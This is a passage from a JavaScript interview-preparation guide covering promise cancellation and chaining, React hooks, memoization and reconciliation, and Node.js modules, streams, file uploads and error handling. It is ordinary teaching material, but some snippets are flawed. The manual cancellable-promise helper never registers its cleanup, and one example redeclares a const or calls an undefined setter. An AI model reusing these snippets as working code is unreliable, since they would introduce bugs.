Normally, once you start a Promise, it runs to completion. But sometimes you want to cancel it - like canceling a food order that's taking too long. JavaScript doesn't have built-in Promise cancellation, but you can use `AbortController` (for fetch) or create cancellable promises manually. It's like having a cancel button on your order.

#### Real-World Scenario / Case Study
A search feature was making API calls on every keystroke. When users typed quickly, multiple requests were in flight, and results could arrive out of order, showing stale data. The app needed to cancel previous requests when new ones started. Using `AbortController` with fetch allowed canceling in-flight requests, ensuring only the latest search results were displayed.

#### Example Code
```js
// Cancellable fetch with AbortController:
function searchUsers(query) {
  const controller = new AbortController();
  const signal = controller.signal;
  
  const promise = fetch(`/api/users?q=${query}`, { signal })
    .then(response => response.json());
  
  // Store controller to cancel later
  promise.cancel = () => controller.abort();
  
  return promise;
}

// Usage:
let currentSearch = null;

function handleSearch(query) {
  // Cancel previous search
  if (currentSearch) {
    currentSearch.cancel();
  }
  
  currentSearch = searchUsers(query);
  currentSearch
    .then(users => displayResults(users))
    .catch(error => {
      if (error.name === 'AbortError') {
        console.log('Search cancelled');
      } else {
        console.error('Search failed:', error);
      }
    });
}

// Manual cancellable promise:
function createCancellablePromise(executor) {
  let cancel;
  const promise = new Promise((resolve, reject) => {
    cancel = () => {
      reject(new Error('Cancelled'));
    };
    executor(resolve, reject, () => cancel);
  });
  promise.cancel = cancel;
  return promise;
}

// Usage:
const work = createCancellablePromise((resolve, reject, onCancel) => {
  const timer = setTimeout(() => resolve('Done'), 5000);
  onCancel(() => clearTimeout(timer));
});

work.cancel();  // Cancels the work
```

---

### Question 40: What is Promise chaining and how does it work?

#### Definition
Promise chaining is like a production line where each step takes the output from the previous step. When you call `.then()` on a Promise, it returns a new Promise. You can chain multiple `.then()` calls together, and each one receives the result from the previous step. It's like a relay race where each runner passes the baton to the next.

#### Real-World Scenario / Case Study
A data processing pipeline had 8 sequential steps. The developer used nested callbacks, making the code hard to read and debug. When step 4 failed, it was unclear which step caused the issue. Refactoring to Promise chains made each step explicit and allowed adding logging between steps easily. Error handling became centralized with a single `.catch()`.

#### Example Code
```js
// Promise chaining:
fetch('/api/user/123')
  .then(response => response.json())  // Returns new Promise
  .then(user => fetch(`/api/profile/${user.id}`))  // Returns fetch Promise
  .then(response => response.json())
  .then(profile => fetch(`/api/settings/${profile.id}`))
  .then(response => response.json())
  .then(settings => {
    console.log('All data loaded:', settings);
    return settings;
  })
  .catch(error => {
    // Catches errors from any step in the chain
    console.error('Failed:', error);
  });

// Each .then() returns a new Promise:
const p1 = Promise.resolve(1);
const p2 = p1.then(x => x * 2);      // p2 is a new Promise
const p3 = p2.then(x => x + 3);      // p3 is a new Promise
p3.then(console.log);                // 5

// BUGGY CODE - not returning in chain:
fetch('/api/data')
  .then(response => {
    response.json();  // Missing return! Next .then() gets undefined
  })
  .then(data => {
    console.log(data);  // undefined
    processData(data);  // Error: can't process undefined
  });

// FIX - always return:
fetch('/api/data')
  .then(response => {
    return response.json();  // Return the Promise
  })
  .then(data => {
    console.log(data);  // Actual data
    return processData(data);
  });
```

---

## React & Frontend Frameworks

### Question 41: How does React's virtual DOM work and why is it faster?

#### Definition
The virtual DOM is like a blueprint or sketch of your UI that React keeps in memory. Instead of directly changing the real webpage (which is slow), React first updates this blueprint, then compares it with the previous blueprint to find what actually changed. Then it only updates those specific parts of the real webpage. It's like editing a document - you make changes on a copy first, then apply only the differences to the original, rather than rewriting everything.

#### Real-World Scenario / Case Study
A dashboard was re-rendering 1000+ DOM elements on every state change, causing 2-3 second freezes. The developer was directly manipulating the DOM, bypassing React. By using React's virtual DOM properly, the app only updated the 5-10 elements that actually changed, reducing render time from 2 seconds to 50ms. The virtual DOM's diffing algorithm identified minimal changes efficiently.

#### Example Code
```js
// Without Virtual DOM (slow - updates everything):
function updateCounter(count) {
  document.getElementById('counter').textContent = count;
  document.getElementById('counter-label').textContent = `Count: ${count}`;
  // Even if only count changed, both elements update
}

// With React Virtual DOM (fast - only updates what changed):
function Counter({ count }) {
  return (
    <div>
      <span id="counter">{count}</span>
      <span id="counter-label">Count: {count}</span>
    </div>
  );
}

// React compares virtual DOM trees:
// Old: <span>5</span>
// New: <span>6</span>
// Only updates the text node, not the entire component

// BUGGY CODE - bypassing virtual DOM:
function BadComponent({ data }) {
  useEffect(() => {
    // Direct DOM manipulation - React doesn't know about this!
    document.querySelector('.list').innerHTML = data.map(item => 
      `<div>${item.name}</div>`
    ).join('');
  }, [data]);
  // React's virtual DOM is out of sync with real DOM
}

// FIX - let React handle it:
function GoodComponent({ data }) {
  return (
    <div className="list">
      {data.map(item => <div key={item.id}>{item.name}</div>)}
    </div>
  );
  // React efficiently updates only changed items
}
```

---

### Question 42: What is the difference between controlled and uncontrolled components in React?

#### Definition
A controlled component is like a remote-controlled car - React is in charge, holding the state and telling the component what to display. An uncontrolled component is like a regular car - it drives itself, managing its own state internally. With controlled components, you have full control and can validate/transform input. With uncontrolled, you get the value when you need it, but less control during input.

#### Real-World Scenario / Case Study
A form had validation that wasn't working - errors appeared after submission instead of during typing. The form used uncontrolled components, so React couldn't validate in real-time. Users filled out entire forms only to see all errors at the end, causing frustration. Converting to controlled components allowed real-time validation and better UX.

#### Example Code
```js
// Uncontrolled component - DOM holds the state:
function UncontrolledForm() {
  const inputRef = useRef();
  
  function handleSubmit(e) {
    e.preventDefault();
    console.log(inputRef.current.value);  // Get value when needed
    // Can't validate or transform during typing
  }
  
  return (
    <form onSubmit={handleSubmit}>
      <input ref={inputRef} defaultValue="initial" />
      <button type="submit">Submit</button>
    </form>
  );
}

// Controlled component - React holds the state:
function ControlledForm() {
  const [value, setValue] = useState('');
  const [error, setError] = useState('');
  
  function handleChange(e) {
    const newValue = e.target.value;
    setValue(newValue);
    
    // Real-time validation:
    if (newValue.length < 3) {
      setError('Must be at least 3 characters');
    } else {
      setError('');
    }
  }
  
  function handleSubmit(e) {
    e.preventDefault();
    console.log(value);  // Always have current value
  }
  
  return (
    <form onSubmit={handleSubmit}>
      <input 
        value={value} 
        onChange={handleChange}
        style={{ borderColor: error ? 'red' : 'black' }}
      />
      {error && <div>{error}</div>}
      <button type="submit">Submit</button>
    </form>
  );
}
```

---

### Question 43: What are React hooks and why were they introduced?

#### Definition
Hooks are like special tools that let functional components do things that were previously only possible in class components - like remembering state, running side effects, or accessing context. Before hooks, you had to use class components for state. Hooks let you use simple functions instead, making code cleaner and easier to reuse. It's like getting a Swiss Army knife that lets a simple tool do complex jobs.

#### Real-World Scenario / Case Study
A codebase had 200+ class components that were hard to test and had inconsistent patterns. Some used lifecycle methods incorrectly, causing memory leaks. Converting to functional components with hooks made the code 40% smaller, easier to test, and eliminated the lifecycle method bugs. Custom hooks allowed sharing logic between components that was previously duplicated.

#### Example Code
```js
// Class component (old way):
class UserProfile extends React.Component {
  constructor(props) {
    super(props);
    this.state = { user: null, loading: true };
  }
  
  componentDidMount() {
    fetchUser(this.props.userId)
      .then(user => this.setState({ user, loading: false }));
  }
  
  componentDidUpdate(prevProps) {
    if (prevProps.userId !== this.props.userId) {
      this.setState({ loading: true });
      fetchUser(this.props.userId)
        .then(user => this.setState({ user, loading: false }));
    }
  }
  
  render() {
    if (this.state.loading) return <div>Loading...</div>;
    return <div>{this.state.user.name}</div>;
  }
}

// Functional component with hooks (new way):
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    setLoading(true);
    fetchUser(userId)
      .then(user => {
        setUser(user);
        setLoading(false);
      });
  }, [userId]);  // Re-run when userId changes
  
  if (loading) return <div>Loading...</div>;
  return <div>{user.name}</div>;
}

// Custom hook (reusable logic):
function useUser(userId) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    setLoading(true);
    fetchUser(userId)
      .then(user => {
        setUser(user);
        setLoading(false);
      });
  }, [userId]);
  
  return { user, loading };
}

// Now multiple components can use it:
function UserProfile({ userId }) {
  const { user, loading } = useUser(userId);
  // ...
}
```

---

### Question 44: What is the purpose of the `useEffect` dependency array?

#### Definition
The dependency array tells `useEffect` when to run. It's like a shopping list - if nothing on the list changes, you don't need to go shopping again. An empty array `[]` means "run once when component mounts." No array means "run after every render." An array with values means "run when any of these values change." It's React's way of knowing when your effect needs to re-run.

#### Real-World Scenario / Case Study
A chat application was making API calls on every render, causing hundreds of unnecessary requests per minute. The `useEffect` was missing a dependency array, so it ran after every state update. When users typed messages, each keystroke triggered a new API call. Adding the correct dependency array reduced API calls from 500/minute to 1-2/minute.

#### Example Code
```js
function Component({ userId }) {
  const [count, setCount] = useState(0);
  
  // BUGGY - runs after EVERY render:
  useEffect(() => {
    fetchUserData(userId);  // Called on every render!
  });  // No dependency array
  
  // BUGGY - missing dependency:
  useEffect(() => {
    fetchUserData(userId);  // Should re-run when userId changes
  }, []);  // Empty array - only runs once, ignores userId changes
  
  // CORRECT:
  useEffect(() => {
    fetchUserData(userId);  // Runs when userId changes
  }, [userId]);  // Re-runs when userId changes
  
  // Runs once on mount:
  useEffect(() => {
    setupConnection();
    return () => cleanupConnection();  // Cleanup on unmount
  }, []);  // Empty array = run once
  
  // Runs when count changes:
  useEffect(() => {
    document.title = `Count: ${count}`;
  }, [count]);
  
  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;
}
```

---

### Question 45: How does `useMemo` and `useCallback` optimize React performance?

#### Definition
`useMemo` is like writing down an expensive calculation so you don't have to do it again unless the inputs change. `useCallback` is like keeping the same function reference so React doesn't think it's a new function. Both prevent unnecessary re-renders and recalculations. It's like caching - you remember the answer instead of recalculating every time.

#### Real-World Scenario / Case Study
A data table with 1000 rows was re-rendering all rows when any filter changed. Each row had expensive calculations that ran on every render. Using `useMemo` for the calculations and `useCallback` for event handlers reduced re-renders from 1000 rows to only the rows that actually changed. Render time dropped from 2 seconds to 100ms.

#### Example Code
```js
function ExpensiveComponent({ items, filter }) {
  // BUGGY - recalculates on every render:
  const filteredItems = items.filter(item => 
    item.name.includes(filter)
  );
  
  const expensiveValue = filteredItems.reduce((sum, item) => {
    // Expensive calculation
    return sum + complexCalculation(item);
  }, 0);
  
  // BUGGY - new function on every render:
  const handleClick = (id) => {
    console.log('Clicked:', id);
  };
  
  return (
    <div>
      {filteredItems.map(item => (
        <ExpensiveChild 
          key={item.id} 
          item={item}
          onClick={handleClick}  // New function = child re-renders
        />
      ))}
    </div>
  );
}

// OPTIMIZED:
function ExpensiveComponent({ items, filter }) {
  // Only recalculates when items or filter changes:
  const filteredItems = useMemo(() => {
    return items.filter(item => item.name.includes(filter));
  }, [items, filter]);
  
  const expensiveValue = useMemo(() => {
    return filteredItems.reduce((sum, item) => {
      return sum + complexCalculation(item);
    }, 0);
  }, [filteredItems]);
  
  // Same function reference unless dependencies change:
  const handleClick = useCallback((id) => {
    console.log('Clicked:', id);
  }, []);  // No dependencies = same function always
  
  return (
    <div>
      {filteredItems.map(item => (
        <ExpensiveChild 
          key={item.id} 
          item={item}
          onClick={handleClick}  // Same reference = no re-render
        />
      ))}
    </div>
  );
}
```

---

### Question 46: What causes infinite loops in `useEffect` and how to fix them?

#### Definition
An infinite loop happens when `useEffect` runs, updates state, which causes a re-render, which triggers `useEffect` again, which updates state again, and so on forever. It's like a dog chasing its tail - it never stops. This usually happens when the dependency array includes values that change every render, or when you update state that's in the dependency array without proper conditions.

#### Real-World Scenario / Case Study
A component was making API calls in an infinite loop, sending thousands of requests per minute and crashing the server. The `useEffect` had a dependency that was a new object created on every render, so React thought it changed every time. The effect ran, updated state, caused re-render, created new object, effect ran again. The fix required memoizing the dependency or restructuring the code.

#### Example Code
```js
function Component() {
  const [count, setCount] = useState(0);
  const [data, setData] = useState(null);
  
  // INFINITE LOOP - updates state that triggers effect:
  useEffect(() => {
    setCount(count + 1);  // Updates count
  }, [count]);  // count is dependency, so runs again!
  
  // INFINITE LOOP - new object every render:
  const config = { apiUrl: 'https://api.com' };
  useEffect(() => {
    fetchData(config);
  }, [config]);  // config is new object every render!
  
  // INFINITE LOOP - function recreated every render:
  function fetchData() {
    setData({ loaded: true });
  }
  useEffect(() => {
    fetchData();
  }, [fetchData]);  // fetchData is new function every render!
  
  // FIX 1 - remove from dependencies if not needed:
  useEffect(() => {
    setCount(c => c + 1);  // Use functional update
  }, []);  // No dependencies
  
  // FIX 2 - memoize object:
  const config = useMemo(() => ({ apiUrl: 'https://api.com' }), []);
  useEffect(() => {
    fetchData(config);
  }, [config]);  // config is stable now
  
  // FIX 3 - use useCallback or move function inside:
  useEffect(() => {
    function fetchData() {
      setData({ loaded: true });
    }
    fetchData();
  }, []);  // No dependencies needed
}
```

---

### Question 47: What is the difference between `useState` and `useRef`?

#### Definition
`useState` is like a variable that, when changed, tells React "hey, something changed, please re-render!" `useRef` is like a variable that can change but doesn't trigger re-renders - React doesn't care about it. Use `useState` for values that affect what's displayed. Use `useRef` for values you need to remember but don't want to cause re-renders, like timer IDs or DOM element references.

#### Real-World Scenario / Case Study
A stopwatch component was re-rendering on every millisecond update, causing performance issues. The developer used `useState` for the timer interval ID, which caused unnecessary re-renders. Switching to `useRef` for the interval ID eliminated the re-renders while still allowing access to the current interval value.

#### Example Code
```js
function Component() {
  const [count, setCount] = useState(0);  // Causes re-render when changed
  const intervalRef = useRef(null);      // Doesn't cause re-render
  
  // useState - triggers re-render:
  function startTimer() {
    const id = setInterval(() => {
      setCount(c => c + 1);  // Re-renders component
    }, 1000);
    setIntervalId(id);  // Also causes re-render (unnecessary!)
  }
  
  // useRef - no re-render:
  function startTimer() {
    const id = setInterval(() => {
      setCount(c => c + 1);
    }, 1000);
    intervalRef.current = id;  // No re-render, just stores value
  }
  
  function stopTimer() {
    clearInterval(intervalRef.current);  // Access stored value
  }
  
  // useRef for DOM reference:
  const inputRef = useRef(null);
  
  function focusInput() {
    inputRef.current.focus();  // Access DOM element
  }
  
  return (
    <div>
      <input ref={inputRef} />
      <button onClick={focusInput}>Focus</button>
    </div>
  );
}
```

---

### Question 48: How does React's reconciliation algorithm work?

#### Definition
Reconciliation is React's process of figuring out what changed in the UI. It's like comparing two photos to see what's different. React creates a virtual DOM tree, compares it with the previous tree, and finds the minimum number of changes needed. It uses a "diffing" algorithm that's smart about reusing components and only updating what actually changed. It's like a smart editor that only changes the words that are different, not rewriting the whole document.

#### Real-World Scenario / Case Study
A list of 1000 items was re-rendering completely when one item changed, causing performance issues. The developer wasn't using `key` props correctly, so React couldn't identify which items were the same. React thought all items were new and recreated the entire list. Adding proper `key` props allowed React to track items and only update the changed one, improving performance 100x.

#### Example Code
```js
// BUGGY - no keys, React can't track items:
function ItemList({ items }) {
  return (
    <ul>
      {items.map(item => (
        <li>{item.name}</li>  // No key - React recreates all on reorder
      ))}
    </ul>
  );
}

// If items array changes from [A, B, C] to [B, A, C]:
// React thinks all items changed and recreates all <li> elements

// FIX - with keys:
function ItemList({ items }) {
  return (
    <ul>
      {items.map(item => (
        <li key={item.id}>{item.name}</li>  // React tracks by id
      ))}
    </ul>
  );
}

// Now React knows:
// - Item with id=2 moved from position 1 to 0 (just reorder)
// - Item with id=1 moved from position 0 to 1 (just reorder)
// - Item with id=3 stayed in position 2 (no change)
// Only updates DOM positions, doesn't recreate elements

// BUGGY - using index as key:
function ItemList({ items }) {
  return (
    <ul>
      {items.map((item, index) => (
        <li key={index}>{item.name}</li>  // Bad! Index changes on reorder
      ))}
    </ul>
  );
}

// If items reorder, keys change, React thinks they're new items
```

---

### Question 49: What is the purpose of React Context and when should you use it?

#### Definition
React Context is like a bulletin board that any component can read from, without passing props through every level. Instead of giving a message to person A, who gives it to person B, who gives it to person C (prop drilling), you post it on a board that everyone can see. It's useful for data that many components need, like user info or theme settings, but can cause performance issues if overused.

#### Real-World Scenario / Case Study
A theme system required passing theme props through 8 component levels. Adding a new theme value meant updating 8 components. The code was hard to maintain. Converting to Context allowed any component to access theme directly. However, the initial implementation caused all consumers to re-render on any theme change. Using context splitting and memoization fixed the performance issue.

#### Example Code
```js
// Prop drilling (tedious):
function App() {
  const theme = { color: 'blue' };
  return <Header theme={theme} />;
}

function Header({ theme }) {
  return <Navigation theme={theme} />;
}

function Navigation({ theme }) {
  return <Button theme={theme} />;
}

function Button({ theme }) {
  return <button style={{ color: theme.color }}>Click</button>;
}

// With Context (cleaner):
const ThemeContext = React.createContext();

function App() {
  const theme = { color: 'blue' };
  return (
    <ThemeContext.Provider value={theme}>
      <Header />
    </ThemeContext.Provider>
  );
}

function Header() {
  return <Navigation />;  // No prop passing
}

function Navigation() {
  return <Button />;  // No prop passing
}

function Button() {
  const theme = useContext(ThemeContext);  // Get theme directly
  return <button style={{ color: theme.color }}>Click</button>;
}

// PERFORMANCE ISSUE - all consumers re-render:
const AppContext = React.createContext();

function App() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState({ color: 'blue' });
  
  // BUGGY - changing theme re-renders all user consumers:
  return (
    <AppContext.Provider value={{ user, theme }}>
      <UserProfile />  {/* Re-renders when theme changes! */}
    </AppContext.Provider>
  );
}

// FIX - split contexts:
const UserContext = React.createContext();
const ThemeContext = React.createContext();

function App() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState({ color: 'blue' });
  
  return (
    <UserContext.Provider value={user}>
      <ThemeContext.Provider value={theme}>
        <UserProfile />  {/* Only re-renders when user changes */}
      </ThemeContext.Provider>
    </UserContext.Provider>
  );
}
```

---

### Question 50: How do you prevent unnecessary re-renders in React?

#### Definition
Re-renders happen when React thinks something changed. To prevent unnecessary ones, you need to tell React "this hasn't actually changed, don't re-render." You can do this with `React.memo` (for components), `useMemo` (for values), `useCallback` (for functions), or by ensuring props/state references stay the same when values don't change. It's like telling someone "nothing's different, don't bother checking again."

#### Real-World Scenario / Case Study
A dashboard with 50 components was re-rendering all components when any filter changed, even components that didn't use the filter. Each re-render took 50-100ms, causing 2-5 second freezes. Using `React.memo` and proper memoization reduced re-renders from 50 components to 2-3 that actually needed updates, cutting render time by 95%.

#### Example Code
```js
// BUGGY - re-renders on every parent render:
function ExpensiveChild({ data }) {
  // Expensive computation on every render
  const processed = expensiveProcess(data);
  return <div>{processed}</div>;
}

function Parent() {
  const [count, setCount] = useState(0);
  const data = { items: [1, 2, 3] };
  
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <ExpensiveChild data={data} />  {/* Re-renders when count changes! */}
    </div>
  );
}

// FIX 1 - React.memo:
const ExpensiveChild = React.memo(function ExpensiveChild({ data }) {
  const processed = expensiveProcess(data);
  return <div>{processed}</div>;
});

// But data is new object every render, so still re-renders!

// FIX 2 - memoize data:
function Parent() {
  const [count, setCount] = useState(0);
  const data = useMemo(() => ({ items: [1, 2, 3] }), []);  // Stable reference
  
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <ExpensiveChild data={data} />  {/* Only re-renders if data actually changes */}
    </div>
  );
}

// FIX 3 - custom comparison:
const ExpensiveChild = React.memo(
  function ExpensiveChild({ data }) {
    const processed = expensiveProcess(data);
    return <div>{processed}</div>;
  },
  (prevProps, nextProps) => {
    // Return true if props are equal (skip re-render)
    return prevProps.data.items.length === nextProps.data.items.length;
  }
);
```

---

## Node.js & Backend

### Question 51: What is the difference between `require` and `import` in Node.js?

#### Definition
`require` is the old way Node.js loads modules - it's synchronous (blocks until loaded) and works at runtime. `import` is the newer ES6 way - it's static (analyzed at build time) and can be asynchronous. Think of `require` as going to a store and waiting in line, while `import` is like ordering online - the system knows what you need ahead of time and can optimize.

#### Real-World Scenario / Case Study
A Node.js application was mixing `require` and `import` inconsistently, causing module loading issues. Some modules used ES6 exports but were imported with `require`, causing `undefined` values. The codebase needed to standardize on one system. Migrating to ES6 modules improved tree-shaking and allowed better static analysis, but required updating all 500+ files.

#### Example Code
```js
// CommonJS (require) - synchronous:
const fs = require('fs');
const { readFile } = require('fs').promises;

// ES6 modules (import) - static:
import fs from 'fs';
import { readFile } from 'fs/promises';
import * as utils from './utils.js';

// BUGGY - mixing systems:
// file1.js (ES6):
export const data = { value: 42 };

// file2.js (CommonJS):
const { data } = require('./file1.js');  // Error! Can't require ES6 module

// FIX - use consistent system:
// Option 1: All CommonJS
module.exports = { data: { value: 42 } };
const { data } = require('./file1.js');

// Option 2: All ES6 (need "type": "module" in package.json)
export const data = { value: 42 };
import { data } from './file1.js';

// Dynamic import (works in both):
async function loadModule() {
  const module = await import('./module.js');
  return module.default;
}
```

---

### Question 52: How does Node.js handle concurrent requests with a single thread?

#### Definition
Node.js uses an event loop - it's like a restaurant with one waiter but many tables. The waiter takes orders (handles requests) and gives them to the kitchen (async operations). While food is cooking, the waiter serves other tables. When food is ready, the waiter delivers it. Node.js is single-threaded for JavaScript code, but uses a thread pool for I/O operations, so it can handle thousands of concurrent connections efficiently.

#### Real-World Scenario / Case Study
A Node.js API server was handling 10,000 concurrent connections but started slowing down. The developer added CPU-intensive image processing in the main thread, blocking the event loop. All requests queued up, causing 30+ second response times. Moving the processing to worker threads or a queue system restored performance, allowing the event loop to continue handling requests.

#### Example Code
```js
// BUGGY - blocks event loop:
app.get('/process', (req, res) => {
  // CPU-intensive work blocks everything!
  const result = processLargeImage(req.body.image);  // Takes 5 seconds
  res.json({ result });
  // No other requests can be handled during this time
});

// FIX 1 - use async I/O (non-blocking):
app.get('/process', async (req, res) => {
  // I/O operations don't block
  const data = await fs.promises.readFile('large-file.txt');
  res.json({ data });
  // Event loop can handle other requests while waiting for file read
});

// FIX 2 - use worker threads for CPU-intensive work:
const { Worker } = require('worker_threads');

app.get('/process', (req, res) => {
  const worker = new Worker('./image-processor.js', {
    workerData: { image: req.body.image }
  });
  
  worker.on('message', (result) => {
    res.json({ result });
  });
  
  // Event loop free to handle other requests
});

// FIX 3 - use cluster for multiple processes:
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster) {
  // Fork workers for each CPU core
  for (let i = 0; i < os.cpus().length; i++) {
    cluster.fork();
  }
} else {
  // Worker process handles requests
  app.listen(3000);
}
```

---

### Question 53: What is the event emitter pattern and how is it used in Node.js?

#### Definition
Event emitters are like a radio station - they broadcast events, and listeners (like radios) can tune in to hear them. When something happens (an event), the emitter notifies all listeners. It's a way for different parts of your code to communicate without directly calling each other. Many Node.js built-in modules use this pattern - streams, HTTP servers, file watchers, etc.

#### Real-World Scenario / Case Study
A file processing system needed to notify multiple services when files were uploaded. The developer used direct function calls, creating tight coupling. When a new service needed notifications, multiple files had to be updated. Converting to an event emitter pattern allowed services to subscribe to events independently. Adding new listeners became trivial without modifying existing code.

#### Example Code
```js
const EventEmitter = require('events');

// Create custom event emitter:
class FileProcessor extends EventEmitter {
  processFile(filename) {
    this.emit('start', filename);
    
    // Simulate processing
    setTimeout(() => {
      this.emit('progress', { filename, percent: 50 });
    }, 1000);
    
    setTimeout(() => {
      this.emit('complete', { filename, size: 1024 });
    }, 2000);
  }
}

const processor = new FileProcessor();

// Listeners subscribe to events:
processor.on('start', (filename) => {
  console.log(`Processing started: ${filename}`);
});

processor.on('progress', (data) => {
  console.log(`Progress: ${data.percent}%`);
});

processor.on('complete', (data) => {
  console.log(`Completed: ${data.filename}, size: ${data.size}`);
});

processor.processFile('document.pdf');

// REAL USE CASE - HTTP server:
const http = require('http');

const server = http.createServer();

server.on('request', (req, res) => {
  res.end('Hello World');
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

server.listen(3000);

// BUGGY - memory leak with listeners:
function addListener() {
  processor.on('event', () => {
    // Listener never removed - memory leak!
  });
}

// FIX - remove listeners:
function addListener() {
  const handler = () => {
    // Do something
  };
  processor.on('event', handler);
  
  // Remove when done:
  processor.removeListener('event', handler);
  
  // Or use once() for one-time listeners:
  processor.once('event', handler);  // Auto-removed after first call
}
```

---

### Question 54: How do you handle file uploads in Node.js efficiently?

#### Definition
File uploads can be large and memory-intensive. Instead of loading the entire file into memory, you use streams - like a pipe that processes water (file data) as it flows through, rather than filling a bucket first. This allows handling files larger than available RAM. You can also limit file size, validate types, and process chunks as they arrive.

#### Real-World Scenario / Case Study
A file upload endpoint was crashing when users uploaded files larger than 100MB. The server tried to load entire files into memory, causing out-of-memory errors. The fix used streaming with `multer` or `formidable`, processing files in chunks. This allowed handling 1GB+ files without memory issues. Adding file size limits and type validation prevented malicious uploads.

#### Example Code
```js
// BUGGY - loads entire file into memory:
app.post('/upload', (req, res) => {
  let data = '';
  req.on('data', chunk => {
    data += chunk;  // Accumulates in memory - crashes on large files!
  });
  req.on('end', () => {
    fs.writeFile('uploaded-file', data, () => {
      res.send('Uploaded');
    });
  });
});

// FIX 1 - use streams:
const fs = require('fs');
const path = require('path');

app.post('/upload', (req, res) => {
  const filePath = path.join(__dirname, 'uploads', 'file');
  const writeStream = fs.createWriteStream(filePath);
  
  req.pipe(writeStream);  // Streams directly to disk
  
  writeStream.on('finish', () => {
    res.send('Uploaded');
  });
  
  writeStream.on('error', (error) => {
    res.status(500).send('Upload failed');
  });
});

// FIX 2 - use multer (popular library):
const multer = require('multer');
const upload = multer({
  dest: 'uploads/',
  limits: {
    fileSize: 10 * 1024 * 1024  // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Validate file type
    if (file.mimetype === 'image/jpeg' || file.mimetype === 'image/png') {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'));
    }
  }
});

app.post('/upload', upload.single('file'), (req, res) => {
  res.json({ filename: req.file.filename });
});

// FIX 3 - process chunks as they arrive:
app.post('/upload', (req, res) => {
  let totalSize = 0;
  const maxSize = 10 * 1024 * 1024;  // 10MB
  
  req.on('data', (chunk) => {
    totalSize += chunk.length;
    if (totalSize > maxSize) {
      req.destroy();  // Stop receiving
      return res.status(413).send('File too large');
    }
    // Process chunk
  });
  
  req.on('end', () => {
    res.send('Uploaded');
  });
});
```

---

### Question 55: What are streams in Node.js and when should you use them?

#### Definition
Streams are like a conveyor belt - data flows through in chunks rather than all at once. Instead of loading a huge file into memory, you process it piece by piece as it arrives. There are readable streams (data coming in), writable streams (data going out), and duplex streams (both ways). They're perfect for large files, network data, or real-time processing.

#### Real-World Scenario / Case Study
A log processing system needed to parse 10GB log files. Loading entire files into memory caused crashes. Using streams allowed processing logs line-by-line, using only a few MB of memory. The system could handle files 100x larger than available RAM. Streams also enabled real-time log tailing, processing new entries as they were written.

#### Example Code
```js
const fs = require('fs');
const { Transform } = require('stream');

// BUGGY - loads entire file:
function processFile(filename) {
  const data = fs.readFileSync(filename, 'utf8');  // Loads all into memory
  const lines = data.split('\n');
  lines.forEach(line => processLine(line));
  // Crashes on large files
}

// FIX - use streams:
function processFile(filename) {
  const readStream = fs.createReadStream(filename, { encoding: 'utf8' });
  let buffer = '';
  
  readStream.on('data', (chunk) => {
    buffer += chunk;
    const lines = buffer.split('\n');
    buffer = lines.pop();  // Keep incomplete line
    
    lines.forEach(line => processLine(line));  // Process complete lines
  });
  
  readStream.on('end', () => {
    if (buffer) processLine(buffer);  // Process last line
  });
}

// Using transform streams:
const upperCaseTransform = new Transform({
  transform(chunk, encoding, callback) {
    this.push(chunk.toString().toUpperCase());
    callback();
  }
});

fs.createReadStream('input.txt')
  .pipe(upperCaseTransform)
  .pipe(fs.createWriteStream('output.txt'));

// REAL USE CASE - HTTP response streaming:
app.get('/large-data', (req, res) => {
  const dataStream = getLargeDataSet();  // Returns a stream
  
  res.setHeader('Content-Type', 'application/json');
  res.write('[');  // Start JSON array
  
  let first = true;
  dataStream.on('data', (item) => {
    if (!first) res.write(',');
    res.write(JSON.stringify(item));
    first = false;
  });
  
  dataStream.on('end', () => {
    res.write(']');  // End JSON array
    res.end();
  });
});
```

---

### Question 56: How do you handle errors in Node.js applications?

#### Definition
Error handling in Node.js is crucial because unhandled errors can crash your entire server. You need to catch errors in async operations, handle promise rejections, and listen for uncaught exceptions. It's like having safety nets at different levels - if one fails, another catches it. You also want to log errors properly and return meaningful error messages to clients.

#### Real-World Scenario / Case Study
A production API was crashing randomly, taking down the entire service. The issue was unhandled promise rejections in background jobs. When a database query failed, the error wasn't caught, causing the Node.js process to exit. Adding global error handlers and proper try/catch blocks in all async functions stabilized the service. Error logging helped identify and fix the root causes.

#### Example Code
```js
// BUGGY - unhandled errors crash the process:
app.get('/users', async (req, res) => {
  const users = await db.query('SELECT * FROM users');  // No try/catch!
  res.json(users);
  // If query fails, process crashes
});

// FIX 1 - try/catch in async functions:
app.get('/users', async (req, res) => {
  try {
    const users = await db.query('SELECT * FROM users');
    res.json(users);
  } catch (error) {
    console.error('Database error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// FIX 2 - global error handlers:
process.on('uncaughtException', (error) => {
  console.error('Uncaught exception:', error);
  // Log to error tracking service
  process.exit(1);  // Exit gracefully
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled rejection:', reason);
  // Log to error tracking service
});

// FIX 3 - error middleware:
app.use((error, req, res, next) => {
  console.error('Error:', error);
  
  // Don't leak error details in production
  const message = process.env.NODE_ENV === 'production' 
    ? 'Internal server error'
    : error.message;
  
  res.status(error.status || 500).json({ error: message });
});

// FIX 4 - wrap async route handlers:
function asyncHandler(fn) {
  return (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
  };
}

app.get('/users', asyncHandler(async (req, res) => {
  const users = await db.query('SELECT * FROM users');
  res.json(users);
  // Errors automatically caught and passed to error middleware
}));
```

---

### Question 57: What is middleware in Express.js and how does it work?

#### Definition
Middleware is like a series of checkpoints that requests pass through before reaching your route handler. Each middleware can inspect the request, modify it, run code, or stop the request and send a response. It's like a security checkpoint, then a receptionist, then a guide - each one does something before passing you to the next. Common uses: authentication, logging, parsing request bodies, error handling.

#### Real-World Scenario / Case Study
